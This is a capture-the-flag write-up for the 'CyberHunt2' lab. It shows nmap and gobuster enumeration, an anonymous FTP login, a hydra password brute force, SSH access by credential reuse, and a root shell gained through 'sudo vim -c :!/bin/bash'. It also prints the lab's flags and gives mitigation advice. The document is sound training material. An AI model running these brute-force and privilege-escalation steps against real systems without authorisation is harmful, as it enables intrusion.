@@ -1,0 +1,247 @@
+Challenge-02
+Solving CTF Labs on ThunderCipher
+
+YUVARAJ M
+
+CyberHunt2 – Writeup
+
+Difficulty: Easy
+Category: Linux / Network Exploitation
+Vulnerability: Weak Credentials + Credential Reuse + Sudo Misconfiguration
+Target IP: 192.168.5.183
+Open Ports: 21, 80, 7223
+
+Challenge Description
+
+CyberHunt2 is a network-based challenge focusing on exposed services and weak credentials. The objective is to enumerate open services, identify misconfigurations, reuse discovered credentials, and escalate privileges to obtain both user and root flags.
+
+The hint suggests that weak credentials left during testing may lead to system compromise.
+
+Enumeration Phase
+Step 1 – Initial Port Scanning
+
+Performed initial scan:
+
+nmap 192.168.5.183 -sV
+
+Open ports discovered:
+
+21 (FTP)
+
+80 (HTTP)
+
+📸 Screenshot 1 Placement:
+Insert screenshot of initial nmap scan results showing ports 21 and 80 open.
+
+Step 2 – Web Enumeration
+
+Accessed:
+
+http://192.168.5.183
+
+Checked robots.txt and performed directory enumeration using gobuster.
+
+gobuster dir -u http://192.168.5.183 -w word.dir
+
+Discovered hidden directory:
+
+/happy
+
+📸 Screenshot 2 Placement:
+Insert gobuster result showing /happy discovered.
+
+Accessing /happy revealed an HTML comment:
+
+<!-- username: shadowops >
+
+This exposed a valid username: shadowops
+
+📸 Screenshot 3 Placement:
+Insert browser screenshot showing HTML source with username comment.
+
+FTP Analysis
+
+Connected to FTP:
+
+ftp 192.168.5.183
+
+Anonymous access was allowed.
+
+Discovered a file named:
+
+word.dir
+
+Downloaded the wordlist for further enumeration.
+
+📸 Screenshot 4 Placement:
+Insert FTP login and file listing screenshot.
+
+Credential Brute Force
+
+Using discovered username and wordlist:
+
+hydra -l shadowops -P word.dir ftp://192.168.5.183
+
+Valid credentials found:
+
+Username: shadowops
+Password: Ti@gO
+
+📸 Screenshot 5 Placement:
+Insert Hydra output showing successful login.
+
+User Flag Retrieval
+
+Logged in via FTP using discovered credentials.
+
+Downloaded:
+
+user.txt
+
+Flag obtained:
+
+ThunderCipher{ftp_to_ssh_owned_0x8917}
+
+📸 Screenshot 6 Placement:
+Insert screenshot of cat user.txt showing user flag.
+
+Hidden Service Discovery
+
+Performed full port scan:
+
+nmap -p- 192.168.5.183
+
+Discovered additional open port:
+
+7223 (SSH)
+
+Service version scan:
+
+nmap -p 7223 -sV 192.168.5.183
+
+Service identified:
+
+OpenSSH 8.2p1 Ubuntu
+
+📸 Screenshot 7 Placement:
+Insert full port scan result showing port 7223 open.
+
+SSH Access
+
+Connected via SSH:
+
+ssh shadowops@192.168.5.183 -p 7223
+
+Used previously discovered password.
+
+Successfully logged in as:
+
+shadowops
+
+📸 Screenshot 8 Placement:
+Insert SSH login screenshot showing successful access.
+
+Privilege Escalation
+
+Checked sudo permissions:
+
+sudo -l
+
+Output:
+
+(root) NOPASSWD: /usr/bin/vim
+
+This indicates a Sudo Misconfiguration.
+
+📸 Screenshot 9 Placement:
+Insert screenshot of sudo -l output.
+
+Exploiting Vim for Root Access
+
+Executed:
+
+sudo vim -c ':!/bin/bash'
+
+Spawned root shell.
+
+Verified:
+
+whoami
+root
+
+📸 Screenshot 10 Placement:
+Insert screenshot showing root shell after vim exploit.
+
+Root Flag
+
+Retrieved:
+
+cat /root/root.txt
+
+Flag:
+
+ThunderCipher{misconfigurations_dont_get_exploited_people_do}
+
+📸 Screenshot 11 Placement:
+Insert screenshot showing root flag.
+
+Vulnerability Explanation
+1️⃣ Weak Credentials
+
+Test credentials were left active in FTP.
+
+2️⃣ Credential Reuse
+
+Same credentials worked for SSH service.
+
+3️⃣ Hidden Service (Security by Obscurity)
+
+SSH was running on non-standard port 7223.
+
+4️⃣ Sudo Misconfiguration
+
+User allowed to run /usr/bin/vim as root without password.
+
+This falls under:
+
+Broken Access Control
+OWASP Top 10 – A01
+
+Impact
+
+• Full system compromise
+• User data exposure
+• Root-level access achieved
+• Misconfiguration allowed total takeover
+
+Mitigation
+
+• Disable anonymous FTP
+• Enforce strong password policies
+• Avoid credential reuse
+• Remove unnecessary sudo privileges
+• Do not allow editors like vim in sudo without restriction
+• Restrict SSH to standard port with firewall rules
+
+Attack Flow Summary
+
+• Scanned target → Found FTP & HTTP
+• Discovered hidden directory → Found username
+• Brute forced FTP → Found password
+• Retrieved user flag
+• Full port scan → Found hidden SSH
+• Reused credentials → SSH access
+• Checked sudo permissions
+• Exploited vim NOPASSWD
+• Gained root access
+• Retrieved root flag
+
+Final Flags
+
+User Flag:
+
+ThunderCipher{ftp_to_ssh_owned_0x8917}
+
+Root Flag:
+
+ThunderCipher{misconfigurations_dont_get_exploited_people_do}
